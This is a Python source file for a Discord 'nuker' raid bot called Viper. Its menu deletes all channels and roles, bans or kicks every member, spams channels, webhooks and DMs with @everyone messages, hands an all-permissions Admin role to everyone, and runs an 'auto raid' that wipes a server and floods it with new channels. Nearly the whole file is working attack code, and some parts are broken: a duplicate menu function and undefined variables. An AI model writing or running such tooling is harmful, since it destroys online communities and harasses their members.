import discord
from discord.ext import commands
import asyncio
from pystyle import Center, Colorate, Colors
import os
from colorama import Style
import time
import random
import urllib
import config



bot_token = input(Colorate.Horizontal(Colors.pink_to_white, "Bot Token ~ "))
server_id = input(Colorate.Horizontal(Colors.pink_to_white, "Server ID ~ "))

b = Colors.blue
w = Colors.pink
r = Style.RESET_ALL

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=".", intents=intents)

def viper():
    ascii_art = """
                        $$\   $$\            $$\                               
                        $$ |  $$ |           \__|                              
                        $$ |  $$ |$$\    $$\ $$\  $$$$$$\   $$$$$$\   $$$$$$\  
                        $$$$$$$$ |\$$\  $$  |$$ |$$  __$$\ $$  __$$\ $$  __$$\ 
                        \_____$$ | \$$\$$  / $$ |$$ /  $$ |$$$$$$$$ |$$ |  \__|
                              $$ |  \$$$  /  $$ |$$ |  $$ |$$   ____|$$ |      
                              $$ |   \$  /   $$ |$$$$$$$  |\$$$$$$$\ $$ |    
                              \__|    \_/    \__|$$  ____/  \_______|\__|  4VMINE,Viper,swattingscene     
                                                 $$ |                          
                                                 $$ |                          
                                                 \__|                                                                                                                     
    """
    
    gradient_colors = Colorate.Vertical(Colors.pink_to_white, ascii_art)
    print(gradient_colors)

def cc():
    os.system('cls' if os.name == 'nt' else 'clear')

@bot.event
async def on_ready():
    cc()
    viper()
    await show_menu()

async def show_menu():
    while True:
        menu_text = f"""
                      {w}[{b}1{w}] Kill Server     {w}[{b}6{w}] Get Admin  
                      {w}[{b}2{w}] Spam Webhook    {w}[{b}7{w}] DM All
                      {w}[{b}3{w}] Create Roles    {w}[{b}8{w}] Create Channel
                      {w}[{b}4{w}] Delete Roles    {w}[{b}9{w}] Delete Channel
                      {w}[{b}5{w}] Ban Alls        {w}[{b}>{w}] next page
        """
        print(Center.XCenter(menu_text))
        
        choice = await bot.loop.run_in_executor(None, input, Colorate.Horizontal(Colors.pink_to_white, "                       Viper Input ~ "))

        if choice == '1':
            await nuke(server_id)
            await auto_raid(server_id)
        elif choice == '2':
            await webhook_spam(server_id)
        elif choice == '3':
            await create_roles(server_id)
        elif choice == '4':
            await delete_roles(server_id)
        elif choice == '5':
            await ban_all(server_id)
        elif choice == '6':
            await get_admin(server_id)
        elif choice == '7':
            await dm_all(server_id)
        elif choice == '8':
            await create_channels(server_id)
        elif choice == '9':
            await delete_channels(server_id)
        elif choice == '10':
            await change_server(server_id)
        else:
            print(Colorate.Horizontal(Colors.pink_to_white, "Wrong choice, pick one from the Menu"))
            continue
        
        await bot.loop.run_in_executor(None, input, Colorate.Horizontal(Colors.pink_to_white, "Press Enter to return to the menu"))
        cc()
        viper()

async def show_menu():
    while True:
        next_page = f"""
                      {w}[{b}1{w}] mute all      {w}[{b}<{w}] old page
                      {w}[{b}2{w}] kick all    
                      {w}[{b}3{w}] change icon name    
                      {w}[{b}4{w}] Delete emojis    
                      {w}[{b}5{w}] Delete stickers    
        """
        print(Center.XCenter(next_page()))

        choice = await bot.loop.run_in_executor(None, input, Colorate.Horizontal(Colors.pink_to_white, "                       Viper Input ~ "))

        if choice == '1':
            await mute_all(server_id)
        elif choice == '2':
            await kick_all(server_id)

async def mute_all(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            confirm = input((Colorate.Horizontal(Colors.pink_to_white,f"kick all members y/n"))).lower()
            if confirm == "y":
                start_time_total = time.time()

                tasks = [
                    timeout_member(member, bot_id)
                    for member in guild.members
                ]      
                results = await asyncio.gather(*tasks)

                end_time_total = time.time()

                members_timeouted = results.count(True)
                members_failed = results.count(False)

                print((Colorate.Horizontal(Colors.pink_to_white,f"[+] - {members_kicked} members kicked, {members_failed} members not kicked - Total Time taken: {end_time_total - start_time_total:.2f} seconds")))
            else:
                print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Kick all operation canceled.")))
        else:
            print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Guild not found.")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Error: {e}")))                


from config import NO_BAN_KICK_ID

async def kick_all(server_id, bot_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            confirm = input((Colorate.Horizontal(Colors.pink_to_white,f"kick all members y/n"))).lower()
            if confirm == "y":
                start_time_total = time.time()
                tasks = [
                    kick_member(member, bot_id)
                    for member in guild.members
                ]
                results = await asyncio.gather(*tasks)
                end_time_total = time.time()

                members_kicked = results.count(True)
                members_failed = results.count(False)

                print((Colorate.Horizontal(Colors.pink_to_white,f"[+] - {members_kicked} members kicked, {members_failed} members not kicked - Total Time taken: {end_time_total - start_time_total:.2f} seconds")))
            else:
                print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Kick all operation canceled.")))
        else:
            print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Guild not found.")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Error: {e}")))

async def kick_member(member, bot_id):
    try:
        if member.id not in NO_BAN_KICK_ID and member.id != bot_id:
            await member.kick()
            print((Colorate.Horizontal(Colors.pink_to_white,f"[+]  Member {member.name} kicked")))
            return True
        else:
            if member.id == bot_id:
                pass
            else:
                print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Member {member.name} is in the whitelist, no kick.")))
            return False
    except Exception as e:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Can't kick {member.name}: {e}")))
        return False
            

async def delete_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Invalid server ID. Please enter a valid ID.")))
        return

    if guild is None:
        print(f"[-]Server not found.")
        return

    confirm = await asyncio.to_thread(input, (Colorate.Horizontal(Colors.pink_to_white,(f"u wanna delete every channel? y/n ~ "))))
    confirm = confirm.lower()
    if confirm != 'y':
        print((Colorate.Horizontal(Colors.pink_to_white,"Operation canceled.")))
        return

    try:
        channels = guild.channels
        delete_tasks = [channel.delete() for channel in channels]
        await asyncio.gather(*delete_tasks)
        print((Colorate.Horizontal(Colors.pink_to_white,f"[+] All channels deleted successfully.")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Error deleting channels: {e}")))

async def delete_roles(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Invalid server ID. Please enter a numeric ID.")))
        return

    if guild is None:
        print(f"[-]Server not found.")
        return

    confirm = await asyncio.to_thread(input, (Colorate.Horizontal(Colors.pink_to_white,f"Do you want to delete all roles? y/n ~ ")))
    confirm = confirm.lower()
    if confirm != 'y':
        print((Colorate.Horizontal(Colors.pink_to_white,"Operation canceled.")))
        return

    roles_to_delete = [role for role in guild.roles if role != guild.default_role]

    tasks = []
    for role in roles_to_delete:
        tasks.append(delete_role(role))

    results = await asyncio.gather(*tasks)

    for role, success in zip(roles_to_delete, results):
        if success:
            print((Colorate.Horizontal(Colors.pink_to_white,f"[+] Deleted role {role.id}")))
        else:
            print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Failed to delete role {role.id}")))

async def delete_role(role):
    try:
        await role.delete()
        return True
    except discord.Forbidden:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Failed to delete role {role.id}. Missing permissions.")))
        return False
    except discord.HTTPException as e:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Failed to delete role {role.id} due to HTTPException: {e}")))
        return False


async def nuke(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            start_time_total = time.time()  
            channel_futures = [delete_channel(channel) for channel in guild.channels]

            role_futures = [delete_role(role) for role in guild.roles]

            channel_results = await asyncio.gather(*channel_futures)
            role_results = await asyncio.gather(*role_futures)

            end_time_total = time.time()  

            channels_deleted = channel_results.count(True)
            channels_not_deleted = channel_results.count(False)


            print((Colorate.Horizontal(Colors.pink_to_white,"[+]  successfully deleted")))
        else:
            print((Colorate.Horizontal(Colors.pink_to_white,"[-] Guild not found.")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-] Error: {e}")))




async def create_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Invalid server ID. Please enter a numeric ID.")))
        return

    if guild is None:
        print("Server not found.")
        return

    num_channels = await asyncio.to_thread(input, (Colorate.Horizontal(Colors.pink_to_white,(f"how many channels ~ "))))
    try:
        num_channels = int(num_channels)
    except ValueError:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Invalid number. Please enter a numeric value.")))
        return

    base_name = await asyncio.to_thread(input, (Colorate.Horizontal(Colors.pink_to_white,(f"channel names ~ "))))

    tasks = []
    for i in range(num_channels):
        channel_name = f"{base_name}"
        tasks.append(create_text_channel(guild, channel_name))

    await asyncio.gather(*tasks)

# Function to create a text channel
async def create_text_channel(guild, channel_name):
    try:
        channel = await guild.create_text_channel(channel_name)
        print((Colorate.Horizontal(Colors.pink_to_white,f"[+] {channel.id}created successfully")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Failed to create channel '{channel_name}': {e}")))



async def spam_channel(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            num_messages = int(input((Colorate.Horizontal(Colors.pink_to_white,f"how many messages? ~ "))))
            message_content = input((Colorate.Horizontal(Colors.pink_to_white,f"cusom message or embed ~ ")))

            include_everyone = False
            if message_content.lower() == 'embed':
                include_everyone_input = input((Colorate.Horizontal(Colors.pink_to_white,f"@everyone y/n ~"))).lower()
                include_everyone = include_everyone_input == 'y'

            start_time_total = time.time()
            tasks = [
                send_messages_to_channels(channel, num_messages, message_content, include_everyone)
                for channel in guild.channels
                if isinstance(channel, discord.TextChannel)
            ]

            await asyncio.gather(*tasks)
            end_time_total = time.time()

            print((Colorate.Horizontal(Colors.pink_to_white,f"[+] {num_messages} messages sent to all text channels - Total Time taken: {end_time_total - start_time_total:.2f} seconds")))
        else:
            print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Guild not found.")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Error: {e}")))

async def send_messages_to_channels(channel, num_messages, message_content, include_everyone):
    try:
        for _ in range(num_messages):
            if message_content.lower() == 'embed':
                await send_embed(channel, include_everyone)
            else:
                await channel.send(message_content)
                print((Colorate.Horizontal(Colors.pink_to_white,f"[+]  Message Sent to {channel.name}: {message_content}")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-] Can't send messages to {channel.name}: {e}")))

async def send_embed(channel, include_everyone=False):
    try:
        embed_config = config.EMBED_CONFIG

        embed = discord.Embed(
            title=embed_config.get("title", ""),
            description=embed_config.get("description", ""),
            color=embed_config.get("color", 0),
        )

        for field in embed_config.get("fields", []):
            embed.add_field(name=field["name"], value=field["value"], inline=field.get("inline", False))

        embed.set_image(url=embed_config.get("image", ""))
        embed.set_footer(text=embed_config.get("footer", ""))

        if include_everyone:
            message = f"@everyone {embed_config.get('message', '')}"
        else:
            message = embed_config.get('message', '')

        await channel.send(content=message, embed=embed)
        print((Colorate.Horizontal(Colors.pink_to_white,f"[+]  Embed Sent to {channel.name}")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Can't send embed to {channel.name}: {e}")))


from config import NO_BAN_KICK_ID

async def ban_all(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Invalid server ID. Please enter a numeric ID.")))
        return

    if guild is None:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Server not found.")))
        return

    confirm = await asyncio.to_thread(input, ((Colorate.Horizontal(Colors.pink_to_white,f"ban all members? y/n ~ "))))
    confirm = confirm.lower()
    if confirm != "y":
        print((Colorate.Horizontal(Colors.pink_to_white,"Operation canceled.")))
        return

    ban_tasks = []
    for member in guild.members:
        if member != bot.user:
            ban_tasks.append(ban_member(member))

    try:
        await asyncio.gather(*ban_tasks)
        print((Colorate.Horizontal(Colors.pink_to_white,f"[+] All members banned successfully.")))
    except discord.Forbidden:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Failed to ban members. Missing permissions.")))
    except discord.HTTPException as e:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Failed to ban members due to HTTPException: {e}")))

async def ban_member(member):
    try:
        await member.ban(reason="Mass ban initiated by bot", delete_message_days=0)
        print((Colorate.Horizontal(Colors.pink_to_white,f"[+] {member.id} got banned.")))
    except discord.Forbidden:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Failed to ban {member.name}#{member.discriminator}. Missing permissions.")))
    except discord.HTTPException as e:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Failed to ban {member.name}#{member.discriminator} due to HTTPException: {e}")))

    
async def create_roles(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Invalid server ID. Please enter a numeric ID.")))
        return

    if guild is None:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Server not found.")))
        return

    num_roles = await asyncio.to_thread(input, ((Colorate.Horizontal(Colors.pink_to_white,f"how many roles? ~ "))))
    try:
        num_roles = int(num_roles)
    except ValueError:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Invalid number. Please enter a numeric value.")))
        return

    base_name = await asyncio.to_thread(input, ((Colorate.Horizontal(Colors.pink_to_white,f"role names ~ "))))

    role_creation_tasks = []
    for i in range(num_roles):
        role_name = f"{base_name}"
        role_creation_tasks.append(guild.create_role(name=role_name))

    try:
        created_roles = await asyncio.gather(*role_creation_tasks)
        print((Colorate.Horizontal(Colors.pink_to_white,f"[+] All roles created successfully ~ ")))
        for role in created_roles:
            print(f"- {role.name}")
    except discord.HTTPException as e:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Failed to create roles due to HTTPException ~ {e}")))

async def dm_all(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            message_content = input((Colorate.Horizontal(Colors.pink_to_white,f"message to everyone ~ ")))

            members_sent = 0
            members_fail = 0

            start_time_total = time.time()  
            for member in guild.members:
                if not member.bot:
                    try:
                        start_time_member = time.time() 
                        await member.send(message_content)
                        end_time_member = time.time() 
                        print((Colorate.Horizontal(Colors.pink_to_white,f"[+]  Message Sent to {member.name} ({member.id}) - Time taken: {end_time_member - start_time_member:.2f} seconds")))
                        members_sent += 1
                    except Exception as e:
                        print(f"[-]Can't send message to {member.name}: {e}")
                        members_fail += 1

            end_time_total = time.time()  
            print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Command Used: DM All - {members_sent} messages sent, {members_fail} messages failed - Total Time taken: {end_time_total - start_time_total:.2f} seconds")))
        else:
            print(f"[-]Guild not found.")
    except Exception as e:
        print(f"[-]Error: {e}")

    
async def get_admin(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            user_id_or_all = input((Colorate.Horizontal(Colors.pink_to_white,f"User id or enter for everyone ~ ")))

            color = discord.Colour.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

            start_time_total = time.time()  

            admin_role = await guild.create_role(name="Admin", colour=color, permissions=discord.Permissions.all())

            if not user_id_or_all:
                for member in guild.members:
                    try:
                        if not member.bot:
                            start_time_member = time.time()  
                            await member.add_roles(admin_role)
                            end_time_member = time.time()  
                            print((Colorate.Horizontal(Colors.pink_to_white,f"[+]  Admin role granted to {member.name} - Time taken: {end_time_member - start_time_member:.2f} seconds")))
                    except Exception as e:
                        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Can't grant admin role to {member.name}: {e}")))

                end_time_total = time.time() 
                print((Colorate.Horizontal(Colors.pink_to_white,f"[+] Command Used: Get Admin - Admin role granted to the entire server - Total Time taken: {end_time_total - start_time_total:.2f} seconds")))

            else:
                try:
                    user_id = int(user_id_or_all)
                    target_user = await guild.fetch_member(user_id)
                    if target_user:
                        start_time_target_user = time.time()
                        await target_user.add_roles(admin_role)
                        end_time_target_user = time.time()
                        print((Colorate.Horizontal(Colors.pink_to_white,f"[+]  Admin role granted to {target_user.name} - Time taken: {end_time_target_user - start_time_target_user:.2f} seconds")))
                        print((Colorate.Horizontal(Colors.pink_to_white,f"[+] Command Used: Get Admin - Admin role granted to the entire server - Total Time taken: {end_time_target_user - start_time_target_user:.2f} seconds")))
                    else:
                        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]User with ID {user_id_or_all} not found.")))

                except ValueError:
                    print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Invalid user ID. Please enter a valid user ID or press Enter for the entire server.")))

        else:
            print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Guild not found.")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Error: {e}")))


async def change_server(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            server_config = config.SERVER_CONFIG

            new_name = input((Colorate.Horizontal(Colors.pink_to_white,f"new server name or enter = automatic ~"))) or server_config['new_name']
            new_icon = input((Colorate.Horizontal(Colors.pink_to_white,f"url for new server pfp or enter = automatic ~ "))) or server_config['new_icon']
            new_description = input((Colorate.Horizontal(Colors.pink_to_white,f"new server name or enter = automatic ~ "))) or server_config['new_description']
            start_time_guild_changer = time.time()
            await guild.edit(name=new_name)
            print((Colorate.Horizontal(Colors.pink_to_white,f"[+]  Server name changed")))

            if new_icon:
                with urllib.request.urlopen(new_icon) as response:
                    icon_data = response.read()
                await guild.edit(icon=icon_data)
                print((Colorate.Horizontal(Colors.pink_to_white,f"[+] Icon changed")))

            await guild.edit(description=new_description)
            print((Colorate.Horizontal(Colors.pink_to_white,f"[+]  Description changed")))
            end_time_guild_changer = time.time()

            print((Colorate.Horizontal(Colors.pink_to_white,f"[+] Command Used: Change Server - Server information updated successfully - Total Time taken: {end_time_guild_changer - start_time_guild_changer:.2f} seconds")))
        else:
            print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Guild not found.")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Error: {e}")))

async def spam_webhooks(guild):
    try:
        webhook_config = config.WEBHOOK_CONFIG

        webhooks = []
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                webhook_name = webhook_config["default_name"]
                webhook = await channel.create_webhook(name=webhook_name)
                print((Colorate.Horizontal(Colors.pink_to_white,f"[+]  Webhook Created for {channel.name}: {webhook.name} ({webhook.url})")))
                webhooks.append(webhook)

        num_messages = int(input((Colorate.Horizontal(Colors.pink_to_white,f"number of messages ~ "))))

        message_content = input((Colorate.Horizontal(Colors.pink_to_white,f"enter message or embed ~ ")))

        include_everyone = False
        if message_content.lower() == 'embed':
            include_everyone_input = input((Colorate.Horizontal(Colors.pink_to_white,f"@everyone y/n ~ "))).lower()
            include_everyone = include_everyone_input == 'yes'
        start_time_spam = time.time()
        tasks = [
            send_embed_webhook(webhook, num_messages, message_content, include_everyone)
            if message_content.lower() == 'embed'
            else send_regular_webhook(webhook, num_messages, message_content)
            for webhook in webhooks
        ]
        await asyncio.gather(*tasks)
        end_time_target_spam = time.time()

        print((Colorate.Horizontal(Colors.pink_to_white,f"[+] Command Used: Spam - {num_messages} messages sent via webhooks - Total Time taken: {end_time_target_spam - start_time_spam:.2f} seconds")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Error: {e}")))

async def send_embed_webhook(webhook, num_messages, message_content, include_everyone):
    try:
        for _ in range(num_messages):
            await send_embed_webhook_message(webhook, include_everyone)
    except Exception as e:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Can't send messages via Webhook {webhook.name}: {e}")))

async def send_embed_webhook_message(webhook, include_everyone):
    try:
        embed_config = config.EMBED_CONFIG

        embed = discord.Embed(
            title=embed_config.get("title", ""),
            description=embed_config.get("description", ""),
            color=embed_config.get("color", 0),
        )

        for field in embed_config.get("fields", []):
            embed.add_field(name=field["name"], value=field["value"], inline=field.get("inline", False))

        embed.set_image(url=embed_config.get("image", ""))
        embed.set_footer(text=embed_config.get("footer", ""))

        if include_everyone:
            message = f"@everyone {embed_config.get('message', '')}"
        else:
            message = embed_config.get('message', '')

        await webhook.send(content=message, embed=embed)
        print((Colorate.Horizontal(Colors.pink_to_white,f"[+]  Embed Sent via Webhook {webhook.name}")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Can't send embed via Webhook {webhook.name}: {e}")))

async def send_regular_webhook(webhook, num_messages, message_content):
    try:
        for _ in range(num_messages):
            await webhook.send(content=message_content)
            print((Colorate.Horizontal(Colors.pink_to_white,f"[+]  Message Sent via Webhook {webhook.name}: {message_content}")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Can't send messages via Webhook {webhook.name}: {e}")))

async def webhook_spam(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            await spam_webhooks(guild)
        else:
            print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Guild not found.")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.pink_to_white,f"[-]Error: {e}")))

from config import AUTO_RAID_CONFIG

def log_message(message):
    print((message))

async def delete_channel(channel):
    try:
        start_time = time.time()
        await channel.delete()
        end_time = time.time()
        log_message((Colorate.Horizontal(Colors.pink_to_white,f"[+] Channel {channel.name} deleted - Time taken: {end_time - start_time:.2f} seconds")))
        return True
    except discord.NotFound:
        log_message((Colorate.Horizontal(Colors.pink_to_white,f"[+] Channel {channel.name} not found or already deleted.")))
        return False
    except discord.Forbidden:
        log_message((Colorate.Horizontal(Colors.pink_to_white,f"[+] Permission denied to delete channel {channel.name}.")))
        return False
    except Exception as e:
        log_message((Colorate.Horizontal(Colors.pink_to_white,f"[+]  Error deleting channel {channel.name}: {e}")))
        return False

async def delete_role(role):
    try:
        start_time = time.time()
        await role.delete()
        end_time = time.time()
        log_message((Colorate.Horizontal(Colors.pink_to_white,f"[+] Role {role.name} deleted - Time taken: {end_time - start_time:.2f} seconds")))
        return True
    except Exception as e:
        log_message((Colorate.Horizontal(Colors.pink_to_white,f"[-]Can't delete role {role.name}: {e}")))
        return False

async def create_channel(guild, channel_type, channel_name):
    try:
        start_time = time.time()
        if channel_type == 'text':
            new_channel = await guild.create_text_channel(channel_name)
        elif channel_type == 'voice':
            new_channel = await guild.create_voice_channel(channel_name)

        end_time = time.time()
        log_message((Colorate.Horizontal(Colors.pink_to_white,f"[+] Channel Created {new_channel.id} - Time taken: {end_time - start_time:.2f} seconds")))
        return new_channel
    except Exception as e:
        log_message((Colorate.Horizontal(Colors.pink_to_white,f"[+] Can't create {channel_type} channel: {e}")))
        return None
    
async def send_messages_to_channel(channel, num_messages, message_content, include_everyone):
    try:
        for i in range(num_messages):
            await channel.send(message_content)
            log_message((Colorate.Horizontal(Colors.pink_to_white,f"[-]Message {i+1}/{num_messages} sent to channel {channel.name}")))
        return True
    except Exception as e:
        log_message((Colorate.Horizontal(Colors.pink_to_white,f"[-]Can't send messages to channel {channel.name}: {e}")))
        return False

    
async def spam_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            num_messages = AUTO_RAID_CONFIG['num_messages']
            message_content = AUTO_RAID_CONFIG['message_content']

            start_time_total = time.time()
            tasks = [
                send_messages_to_channel(channel, num_messages, message_content, False)  
                for channel in guild.channels
                if isinstance(channel, discord.TextChannel)
            ]

            await asyncio.gather(*tasks)
            end_time_total = time.time()

            log_message((Colorate.Horizontal(Colors.pink_to_white,f"[+] Command Used: Spam - {num_messages} messages sent to all text channels - Total Time taken: {end_time_total - start_time_total:.2f} seconds")))
        else:
            log_message((Colorate.Horizontal(Colors.pink_to_white,f"[-]Guild not found.")))
    except Exception as e:
        log_message((Colorate.Horizontal(Colors.pink_to_white,f"[-]Message coulnt be send to channel {e}")))

async def auto_raid(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            start_time_total = time.time()  

            num_channels = AUTO_RAID_CONFIG['num_channels']
            channel_type = AUTO_RAID_CONFIG['channel_type']
            channel_name = AUTO_RAID_CONFIG['channel_name']

            channel_futures = [delete_channel(channel) for channel in guild.channels]

            create_channel_futures = [create_channel(guild, channel_type, channel_name) for _ in range(num_channels)]

            channel_results = await asyncio.gather(*channel_futures)
            create_channel_results = await asyncio.gather(*create_channel_futures)

            end_time_total = time.time()  

            channels_deleted = channel_results.count(True)
            channels_not_deleted = channel_results.count(False)

            channels_created = create_channel_results.count(True)
            channels_not_created = create_channel_results.count(False)

            await spam_channels(server_id)

            log_message(f"""[+] Command Used: Nuke - {channels_deleted} channels deleted, {channels_not_deleted} channels not deleted 
[+] Command Used: Create Channels - {channels_created} {channel_type} channels created, {channels_not_created} channels not created - Total Time taken: {end_time_total - start_time_total:.2f} seconds""")

        else:
            log_message((Colorate.Horizontal(Colors.pink_to_white,f"[-] Guild not found.")))
    except Exception as e:
        log_message((Colorate.Horizontal(Colors.pink_to_white,f"[-]Channel couldnt be deleted {e}"))) 



bot.run(bot_token)